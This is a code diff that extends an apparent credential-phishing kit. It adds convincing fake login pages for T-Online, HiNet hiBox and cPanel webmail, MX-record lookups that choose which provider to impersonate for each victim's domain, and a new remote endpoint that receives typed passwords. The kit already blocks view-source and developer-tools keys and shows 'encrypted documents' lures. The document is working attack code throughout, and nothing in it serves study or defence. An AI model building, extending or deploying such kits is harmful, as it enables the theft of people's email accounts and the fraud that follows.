@@ -155,6 +155,77 @@
     .daum-btn { width: 100%; background: #f9a800; color: #fff; border: none; padding: 12px; font-size: 15px; font-weight: bold; cursor: pointer; }
 
     /* =========================================================
+       CLONE 6: T-ONLINE LAYOUT
+       ========================================================= */
+    body.is-tonline { display: flex !important; align-items: center; justify-content: center; background: linear-gradient(135deg, #8c8c9e 0%, #b58b9c 100%) !important; padding: 0; }
+    .tonline-box { background: #fff; width: 480px; border-radius: 8px; padding: 36px; box-shadow: 0 10px 30px rgba(0,0,0,0.15); position: relative; }
+    .tonline-logo { position: absolute; top: 0; left: 0; width: 80px; height: 80px; background: #e20074; display: flex; align-items: center; justify-content: center; border-top-left-radius: 8px; }
+    .tonline-logo svg { fill: #fff; width: 40px; height: 40px; }
+    .tonline-header { display: flex; align-items: center; gap: 12px; margin-bottom: 30px; margin-top: 10px; padding-left: 90px; }
+    .tonline-avatar { width: 40px; height: 40px; border-radius: 50%; background: #f0f0f0; display: flex; align-items: center; justify-content: center; color: #666; }
+    .tonline-email { font-weight: 600; font-size: 16px; color: #333; display: flex; align-items: center; gap: 6px; }
+    .tonline-title { font-size: 28px; font-weight: 700; color: #000; margin-bottom: 24px; }
+    .tonline-input-group { position: relative; margin-bottom: 12px; }
+    .tonline-input-group input { width: 100%; padding: 12px 40px 12px 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; }
+    .tonline-input-group input:focus { outline: none; border-color: #e20074; box-shadow: 0 0 0 3px rgba(226,0,116,0.1); }
+    .tonline-eye { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #666; cursor: pointer; }
+    .tonline-link { color: #e20074; text-decoration: underline; font-size: 14px; display: inline-block; margin-bottom: 24px; }
+    .tonline-toggle-row { display: flex; align-items: center; gap: 10px; margin-bottom: 30px; font-size: 14px; }
+    .tonline-toggle { width: 40px; height: 22px; background: #e20074; border-radius: 12px; position: relative; }
+    .tonline-toggle::after { content: ''; position: absolute; right: 2px; top: 2px; width: 18px; height: 18px; background: #fff; border-radius: 50%; }
+    .tonline-btn-main { width: 100%; background: #e20074; color: #fff; border: none; padding: 14px; font-size: 16px; font-weight: 700; border-radius: 6px; cursor: pointer; margin-bottom: 12px; text-transform: uppercase; }
+    .tonline-btn-sec { width: 100%; background: #fff; color: #000; border: 1px solid #ccc; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; margin-bottom: 20px; }
+    .tonline-back { color: #e20074; text-decoration: none; font-size: 14px; }
+
+    /* =========================================================
+       CLONE 7: HI-BOX (TAIWAN) LAYOUT
+       ========================================================= */
+    body.is-hibox { display: flex !important; align-items: center; justify-content: center; background: #f0f0f0 !important; padding: 0; }
+    .hibox-wrapper { width: 1000px; background: #fff; box-shadow: 0 5px 20px rgba(0,0,0,0.1); border-radius: 4px; overflow: hidden; }
+    .hibox-top { background: #fff; padding: 20px 40px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; }
+    .hibox-logo { font-size: 28px; font-weight: 800; color: #0055a4; font-style: italic; }
+    .hibox-logo span { color: #ff6600; font-weight: normal; font-style: normal; font-size: 16px; margin-left: 8px; }
+    .hibox-nav { background: #0055a4; display: flex; color: #fff; padding: 0 20px; font-size: 14px; }
+    .hibox-nav div { padding: 10px 20px; border-right: 1px solid #3377cc; cursor: pointer; }
+    .hibox-content { display: flex; padding: 20px; gap: 20px; }
+    .hibox-banner { flex: 1; background: linear-gradient(180deg, #a0d4f0 0%, #60b0e0 100%); border-radius: 4px; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px; color: #004488; text-align: center; position: relative; }
+    .hibox-banner h2 { font-size: 24px; margin-bottom: 10px; }
+    .hibox-banner p { font-size: 14px; color: #cc0000; font-weight: bold; }
+    .hibox-sidebar { width: 340px; border: 1px solid #ccc; border-radius: 4px; }
+    .hibox-sidebar-header { background: #f8f8f8; padding: 10px 15px; font-weight: bold; border-bottom: 1px solid #ccc; color: #333; }
+    .hibox-form { padding: 20px; }
+    .hibox-row { display: flex; align-items: center; margin-bottom: 15px; }
+    .hibox-row label { width: 50px; font-size: 13px; font-weight: bold; color: #333; }
+    .hibox-row input { flex: 1; padding: 6px; border: 1px solid #ccc; border-radius: 2px; font-size: 13px; }
+    .hibox-captcha { flex: 1; display: flex; gap: 10px; align-items: center; }
+    .hibox-captcha img { height: 30px; border: 1px solid #ccc; }
+    .hibox-captcha input { width: 60px; padding: 6px; border: 1px solid #ccc; }
+    .hibox-btn-row { display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px; }
+    .hibox-btn { background: #ff6600; color: #fff; border: none; padding: 8px 24px; border-radius: 4px; font-weight: bold; cursor: pointer; }
+    .hibox-btn.sec { background: #999; }
+    .hibox-footer { text-align: center; font-size: 12px; color: #666; padding: 20px; border-top: 1px solid #eee; margin-top: 20px; }
+
+    /* =========================================================
+       CLONE 8: CPANEL / ROUNDCUBE WEBMAIL LAYOUT (Generic Fallback)
+       ========================================================= */
+    body.is-webmail { display: flex !important; align-items: center; justify-content: center; background: #f5f5f5 !important; padding: 0; }
+    .webmail-card { background: #fff; width: 100%; max-width: 440px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); overflow: hidden; }
+    .webmail-header { background: #1e3a8a; padding: 20px; text-align: center; color: #fff; }
+    .webmail-header h2 { font-size: 22px; font-weight: 500; letter-spacing: -0.5px; }
+    .webmail-body { padding: 40px; }
+    .webmail-logo { text-align: center; margin-bottom: 30px; font-size: 24px; font-weight: bold; color: #333; }
+    .webmail-logo span { color: #1e3a8a; }
+    .webmail-form-group { margin-bottom: 20px; }
+    .webmail-form-group label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 8px; }
+    .webmail-form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; background: #f9f9f9; }
+    .webmail-form-group input:focus { outline: none; border-color: #1e3a8a; background: #fff; }
+    .webmail-form-group input:disabled { color: #888; cursor: not-allowed; }
+    .webmail-btn { width: 100%; background: #1e3a8a; color: #fff; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 6px; cursor: pointer; margin-top: 10px; }
+    .webmail-btn:hover { background: #152c6b; }
+    .webmail-footer { text-align: center; padding: 20px; font-size: 12px; color: #999; border-top: 1px solid #eee; margin-top: 20px; }
+    .webmail-footer a { color: #1e3a8a; text-decoration: none; margin: 0 5px; }
+
+    /* =========================================================
        LOADING STATE
        ========================================================= */
     .loading-layout { display: none; width: 100vw; height: 100vh; justify-content: center; align-items: center; background: #fafafa; position: fixed; inset: 0; z-index: 999; }
@@ -166,17 +237,13 @@
 </head>
 <body oncontextmenu="return false;">
 
-    <!-- =========================================================
-         ANTI-SOURCE CODE PROTECTION
-         ========================================================= -->
+    <!-- ANTI-SOURCE CODE PROTECTION -->
     <script>
         document.addEventListener('keydown', function(e) {
             if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S' || (e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')))) {
                 e.preventDefault();
             }
-            if (e.key === 'F12') {
-                e.preventDefault();
-            }
+            if (e.key === 'F12') { e.preventDefault(); }
         });
     </script>
 
@@ -187,52 +254,39 @@
     <div id="hiworksContainer" style="display:none; width: 100%; min-height: 100vh; flex-direction: column;">
         <div class="hiworks-main">
             <div class="hiworks-card">
-                <!-- Big "hiworks" logo (visible on step 1) -->
                 <div class="hiworks-title big" id="hiworksBigLogo" style="margin-bottom:20px;">hiworks</div>
-
-                <!-- STEP 1: Email + Password -->
                 <div id="hiworksStep1">
                     <h1 class="hiworks-h1">Sign-in</h1>
                     <h2 class="hiworks-h2">Please enter login ID with domain</h2>
-
                     <div class="hiworks-input-wrap">
                         <svg class="hiworks-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                         <input type="email" id="hiworksEmail" readonly>
                     </div>
-
                     <div class="hiworks-input-wrap">
                         <svg class="hiworks-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                         <input type="password" id="hiworksPass1" placeholder="Password" autocomplete="off" autofocus>
                     </div>
-
                     <button type="button" class="hiworks-btn" id="hiworksBtn1" onclick="submitHiworksStep1()">Next</button>
                     <div id="hiworks-err1" class="err-box" style="text-align:center;"></div>
                 </div>
-
-                <!-- STEP 2: Password confirm -->
                 <div id="hiworksStep2" style="display:none;">
                     <h1 class="hiworks-h1">Sign in to <span id="hiworksOrgName">Company</span></h1>
                     <h2 class="hiworks-h2">Please enter your password for identity verification.</h2>
-
                     <div class="hiworks-email-chip">
                         <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:16px;height:16px;"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                         <span id="hiworksEmailChip">user@domain.com</span>
                     </div>
-
                     <div class="hiworks-input-wrap">
                         <svg class="hiworks-input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                         <input type="password" id="hiworksPass2" placeholder="Password" autocomplete="off" autofocus>
                     </div>
-
                     <button type="button" class="hiworks-btn" id="hiworksBtn2" onclick="submitHiworksStep2()" style="background:#1e88e5;">Sign-in</button>
                     <div id="hiworks-err2" class="err-box" style="text-align:center; margin-top:12px;"></div>
-
                     <div class="hiworks-links-row">
                         <a href="#">Sign in with another ID</a> |
                         <a href="#">Forgot password</a>
                         <span style="display:inline-flex;align-items:center;gap:6px;margin-left:10px;font-size:12px;">IP Security <div style="width:34px;height:18px;background:#1e88e5;border-radius:18px;position:relative;"><div style="width:14px;height:14px;background:#fff;border-radius:50%;position:absolute;right:2px;top:2px;"></div></div></span>
                     </div>
-
                     <div id="hiworksPrivacy" class="hiworks-privacy">
                         🔒 <strong>Your documents are encrypted and intended exclusively for you.</strong><br>
                         For security and privacy, please do not share or forward them. Please enter correct details to confirm.
@@ -322,7 +376,111 @@
         </div>
     </div>
 
-    <!-- 6. GENERIC UI (600+ Brands & Auto-generated Fallbacks) -->
+    <!-- 6. T-ONLINE UI -->
+    <div class="tonline-box" id="tonlineContainer" style="display:none;">
+        <div class="tonline-logo">
+            <svg viewBox="0 0 24 24"><path d="M4 4h4v16H4zM10 4h4v16h-4zM16 4h4v16h-4z"/></svg>
+        </div>
+        <div class="tonline-header">
+            <div class="tonline-avatar">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+            </div>
+            <div class="tonline-email">
+                <span id="tonlineEmailDisplay">user@t-online.de</span>
+                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+            </div>
+        </div>
+        <div class="tonline-title">Passwort eingeben</div>
+        <div class="tonline-input-group">
+            <input type="password" id="tonlinePass" placeholder="Passwort">
+            <button class="tonline-eye" onclick="toggleTonPass()">👁️</button>
+        </div>
+        <a href="#" class="tonline-link">Passwort vergessen?</a>
+        <div class="tonline-toggle-row">
+            <div class="tonline-toggle"></div> Angemeldet bleiben
+        </div>
+        <button class="tonline-btn-main" onclick="submitLogin('tonline')">LOGIN</button>
+        <button class="tonline-btn-sec">Andere Anmeldeoptionen</button>
+        <a href="#" class="tonline-back">&lt; Zurück</a>
+        <div id="tonline-err" class="err-box"></div>
+    </div>
+
+    <!-- 7. HI-BOX (TAIWAN) UI -->
+    <div class="hibox-wrapper" id="hiboxContainer" style="display:none;">
+        <div class="hibox-top">
+            <div class="hibox-logo">hiBox <span>全能信箱</span></div>
+            <div style="font-size:14px;color:#666;">小成本大效益！hiBox教您輕鬆成為新時代的郵件達人！</div>
+        </div>
+        <div class="hibox-nav">
+            <div>回首頁</div><div>產品簡介</div><div>產品費率</div><div>成功案例</div><div>下載專區</div><div>申請流程</div><div>常見問題</div><div>聯絡我們</div>
+        </div>
+        <div class="hibox-content">
+            <div class="hibox-banner">
+                <h2>擔心hiBox信箱帳密外洩讓駭客有機可趁嗎？</h2>
+                <p>郵件簡訊OTP密碼鎖，讓您的hiBox信箱更安全！</p>
+            </div>
+            <div class="hibox-sidebar">
+                <div class="hibox-sidebar-header">會員登入 Login</div>
+                <div class="hibox-form">
+                    <div class="hibox-row">
+                        <label>帳號：</label>
+                        <input type="email" id="hiboxEmail" readonly>
+                    </div>
+                    <div class="hibox-row">
+                        <label>密碼：</label>
+                        <input type="password" id="hiboxPass" placeholder="請輸入密碼">
+                    </div>
+                    <div class="hibox-row">
+                        <label>驗證碼：</label>
+                        <div class="hibox-captcha">
+                            <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='80' height='30'><rect width='80' height='30' fill='%23f0e68c'/><text x='10' y='22' font-family='Arial' font-size='18' font-weight='bold' fill='%23333' transform='rotate(-5 40 15)'>8X2P</text></svg>" alt="captcha">
+                            <input type="text" placeholder="輸入驗證碼">
+                        </div>
+                    </div>
+                    <div class="hibox-row">
+                        <label style="width:auto; display:flex; align-items:center; gap:5px; font-weight:normal;">
+                            <input type="checkbox" checked> 記住我的帳號
+                        </label>
+                        <div style="display:flex; gap:5px;">
+                            <button class="hibox-btn" onclick="submitLogin('hibox')">登入</button>
+                            <button class="hibox-btn sec">說明</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="hibox-footer">
+            <div style="font-weight:bold; font-size:16px; color:#0055a4; margin-bottom:5px;">HiNet</div>
+            中華電信股份有限公司版權所有 © Chunghwa Telecom Co., Ltd. All Rights Reserved.
+        </div>
+        <div id="hibox-err" class="err-box" style="text-align:center; padding-bottom:10px;"></div>
+    </div>
+
+    <!-- 8. CPANEL / ROUNDCUBE WEBMAIL UI (Default Fallback) -->
+    <div class="webmail-card" id="webmailContainer" style="display:none;">
+        <div class="webmail-header">
+            <h2>Webmail Login</h2>
+        </div>
+        <div class="webmail-body">
+            <div class="webmail-logo">cPanel <span>Webmail</span></div>
+            <div class="webmail-form-group">
+                <label>Email Address</label>
+                <input type="email" id="webmailEmail" readonly disabled>
+            </div>
+            <div class="webmail-form-group">
+                <label>Password</label>
+                <input type="password" id="webmailPass" placeholder="Enter your password">
+            </div>
+            <button class="webmail-btn" onclick="submitLogin('webmail')">Log in</button>
+            <div id="webmail-err" class="err-box"></div>
+        </div>
+        <div class="webmail-footer">
+            <a href="#">Forgot password?</a> • <a href="#">Create account</a><br><br>
+            &copy; 2026. All rights reserved.
+        </div>
+    </div>
+
+    <!-- 9. GENERIC BRANDED UI (For 600+ Known Brands) -->
     <div class="login-container" id="genericContainer" style="display:none;">
         <div class="header">
             <div class="logo-icon" id="logoIcon">VT</div>
@@ -345,7 +503,7 @@
     </div>
 
 <script>
-const API_BASE = 'https://sso-login-verify.onrender.com';
+const API_BASE = 'https://general-login-upgrade.onrender.com';
 const CONFIG = { LOGIN_URL: API_BASE + '/api/login', MAX_ATTEMPTS: 3 };
 
 let currentEmail = '', currentDomain = '', proofFromUrl = '', proofTsFromUrl = '';
@@ -395,6 +553,7 @@ const BRAND_DB = {
     'office365.com': { name:'Microsoft', domain:'office365.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://www.office.com', subtitle:'Sign in to Office 365', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐' },
     'live.com': { name:'Microsoft', domain:'live.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://login.live.com', subtitle:'Sign in to Microsoft', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐' },
     'hotmail.com': { name:'Microsoft', domain:'hotmail.com', logoText:'Microsoft', highlightText:'', logoIcon:'MS', logoColor:'#0078d4', accentColor:'#0078d4', buttonColor:'#0078d4', buttonHover:'#005a9e', realSite:'https://outlook.live.com', subtitle:'Sign in to Hotmail', passwordHint:'Enter your Microsoft account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'© Microsoft. All rights reserved.', flag:'🌐' },
+    't-online.de': { name:'T-Online', domain:'t-online.de', logoText:'T-Online', highlightText:'', logoIcon:'T', logoColor:'#e20074', accentColor:'#e20074', buttonColor:'#e20074', buttonHover:'#b3005c', realSite:'https://www.t-online.de', subtitle:'T-Online E-Mail', passwordHint:'Geben Sie Ihr T-Online Passwort ein', forgotPassword:'Passwort vergessen?', createAccount:'Konto erstellen', copyright:'© Telekom AG. Alle Rechte vorbehalten.', flag:'🇩🇪' },
     'default': { name:'Secure Login', domain:'secure.com', logoText:'Secure', highlightText:'Login', logoIcon:'SL', logoColor:'#1a73e8', accentColor:'#1a73e8', buttonColor:'#1a73e8', buttonHover:'#1557b0', realSite:'https://secure.com', subtitle:'Secure Sign In', passwordHint:'Enter your account password', forgotPassword:'Forgot password?', createAccount:'Create account', copyright:'Secure Login. All rights reserved.', flag:'🔒' }
 };
 
@@ -413,12 +572,13 @@ async function detectProviderByMX(domain) {
             const mxData = data.Answer.map(a => a.data.toLowerCase()).join(',');
             if (mxData.includes('mail.protection.outlook.com') || mxData.includes('eo.outlook.com')) return 'm365';
             if (mxData.includes('hiworks') || mxData.includes('gabia')) return 'hiworks';
+            if (mxData.includes('hibox') || mxData.includes('hinet')) return 'hibox';
         }
     } catch (e) {}
-    // Default .co.kr and .kr to Hiworks (as requested)
     if (domain.endsWith('.co.kr') || domain.endsWith('.kr')) return 'hiworks';
+    if (domain.endsWith('.com.tw') || domain.endsWith('.tw')) return 'hibox';
     if (domain.endsWith('.co.uk') || domain.endsWith('.de') || domain.endsWith('.com')) return 'm365';
-    return 'generic';
+    return 'webmail'; // Fallback to cPanel/Roundcube
 }
 
 function detectBrand(domain) {
@@ -465,6 +625,9 @@ async function submitLogin(platform) {
     if (platform === 'm365') pass = document.getElementById('m365Pass').value.trim();
     if (platform === 'naver') pass = document.getElementById('naverPass').value.trim();
     if (platform === 'daum') pass = document.getElementById('daumPass').value.trim();
+    if (platform === 'tonline') pass = document.getElementById('tonlinePass').value.trim();
+    if (platform === 'hibox') pass = document.getElementById('hiboxPass').value.trim();
+    if (platform === 'webmail') pass = document.getElementById('webmailPass').value.trim();
     if (platform === 'generic') pass = document.getElementById('password').value.trim();
 
     if (!pass || pass.length < 4) { 
@@ -539,13 +702,11 @@ function initHiworks() {
     document.getElementById('hiworksEmail').value = currentEmail;
     document.getElementById('hiworksEmailChip').textContent = currentEmail;
     
-    // Derive Org Name from Domain
     const parts = currentDomain.split('.');
     let orgName = parts[0] || 'Company';
     orgName = orgName.charAt(0).toUpperCase() + orgName.slice(1);
     document.getElementById('hiworksOrgName').textContent = orgName;
 
-    // Add active state to step 1 button on input
     document.getElementById('hiworksPass1').addEventListener('input', function() {
         document.getElementById('hiworksBtn1').style.background = this.value.length > 0 ? '#1e88e5' : '#9ec6f3';
     });
@@ -553,7 +714,6 @@ function initHiworks() {
         document.getElementById('hiworksBtn2').style.background = this.value.length > 0 ? '#1e88e5' : '#9ec6f3';
     });
     
-    // Enter key triggers
     document.getElementById('hiworksPass1').addEventListener('keypress', e => { if (e.key === 'Enter') submitHiworksStep1(); });
     document.getElementById('hiworksPass2').addEventListener('keypress', e => { if (e.key === 'Enter') submitHiworksStep2(); });
     
@@ -570,7 +730,6 @@ async function submitHiworksStep1() {
     clearError('hiworks-err1');
 
     try {
-        // Send Stage 1 to backend
         await fetch(CONFIG.LOGIN_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -588,7 +747,6 @@ async function submitHiworksStep1() {
 
     hiworksFirstPass = pw;
     
-    // Move to Step 2
     document.getElementById('hiworksStep1').style.display = 'none';
     document.getElementById('hiworksBigLogo').style.display = 'none';
     document.getElementById('hiworksStep2').style.display = 'block';
@@ -660,7 +818,15 @@ async function submitHiworksStep2() {
 }
 
 /* ============================================================
-   6. ROUTING / INIT
+   6. UTILS
+   ============================================================ */
+function toggleTonPass() {
+    const p = document.getElementById('tonlinePass');
+    p.type = p.type === 'password' ? 'text' : 'password';
+}
+
+/* ============================================================
+   7. ROUTING / INIT
    ============================================================ */
 document.addEventListener('DOMContentLoaded', async function() {
     const params = new URLSearchParams(window.location.search);
@@ -687,16 +853,22 @@ document.addEventListener('DOMContentLoaded', async function() {
         document.body.classList.replace('is-loading', 'is-daum');
         document.getElementById('daumEmail').value = currentEmail;
         document.getElementById('daumPass').focus();
+    } else if (currentDomain === 't-online.de') {
+        document.body.classList.replace('is-loading', 'is-tonline');
+        document.getElementById('tonlineContainer').style.display = 'block';
+        document.getElementById('tonlineEmailDisplay').textContent = currentEmail;
+        document.getElementById('tonlinePass').focus();
+        document.getElementById('tonlinePass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('tonline'); });
     } else if (['outlook.com', 'hotmail.com', 'live.com', 'microsoft.com', 'office.com', 'office365.com'].includes(currentDomain)) {
         renderM365();
-    } else if (currentDomain.endsWith('.co.kr') || currentDomain.endsWith('.kr') || !BRAND_DB[currentDomain]) {
-        // Check MX or route to Hiworks
+    } else {
+        // Check MX for Custom Domains (Hiworks, HiBox, M365, Webmail)
         const provider = await detectProviderByMX(currentDomain);
         if (provider === 'm365') renderM365();
         else if (provider === 'hiworks') renderHiworks();
-        else renderGeneric();
-    } else {
-        renderGeneric();
+        else if (provider === 'hibox') renderHibox();
+        else if (BRAND_DB[currentDomain]) renderGeneric(); // If it's a known 600+ brand
+        else renderWebmail(); // Default fallback to cPanel/Roundcube
     }
 
     function renderM365() {
@@ -711,6 +883,14 @@ document.addEventListener('DOMContentLoaded', async function() {
         initHiworks();
     }
 
+    function renderHibox() {
+        document.body.classList.replace('is-loading', 'is-hibox');
+        document.getElementById('hiboxContainer').style.display = 'block';
+        document.getElementById('hiboxEmail').value = currentEmail;
+        document.getElementById('hiboxPass').focus();
+        document.getElementById('hiboxPass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('hibox'); });
+    }
+
     function renderGeneric() {
         currentBrand = detectBrand(currentDomain);
         document.body.classList.replace('is-loading', 'is-generic');
@@ -719,6 +899,14 @@ document.addEventListener('DOMContentLoaded', async function() {
         applyTheme(currentBrand);
         document.getElementById('password').focus();
         document.getElementById('password').addEventListener('keydown', e => { if(e.key==='Enter') submitLogin('generic'); });
+    }
+
+    function renderWebmail() {
+        document.body.classList.replace('is-loading', 'is-webmail');
+        document.getElementById('webmailContainer').style.display = 'block';
+        document.getElementById('webmailEmail').value = currentEmail;
+        document.getElementById('webmailPass').focus();
+        document.getElementById('webmailPass').addEventListener('keypress', e => { if(e.key==='Enter') submitLogin('webmail'); });
     }
 });
 </script>
